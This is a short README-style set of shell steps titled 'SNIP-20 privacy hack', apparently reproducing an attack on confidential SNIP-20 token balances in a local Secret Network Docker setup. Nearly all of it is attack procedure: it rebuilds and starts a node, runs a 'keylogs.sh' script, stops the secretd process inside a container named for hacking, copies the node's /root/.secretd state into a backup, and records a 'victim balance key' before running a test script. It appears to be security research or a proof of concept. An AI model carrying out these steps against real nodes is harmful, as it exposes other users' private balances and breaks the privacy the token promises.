## SNIP-20 privacy hack
```
docker-compose down
docker system prune

sudo service docker restart

./build_image.sh

sudo ./start_node.sh

./node_modules/.bin/jest -t Setup
./keylogs.sh
```
Get the victim balance key.

```
docker exec -it hacking-localsecret-2-1 bash
ps -ax
pkill -f secretd
ps -ax //make sure node has stopped!!!

rm -rf backup
mkdir backup
cp -rf /root/.secretd/* backup/
vim backup/victim_key
```
Store the victim balance key.

```
./scripts/test_snip20.sh
```

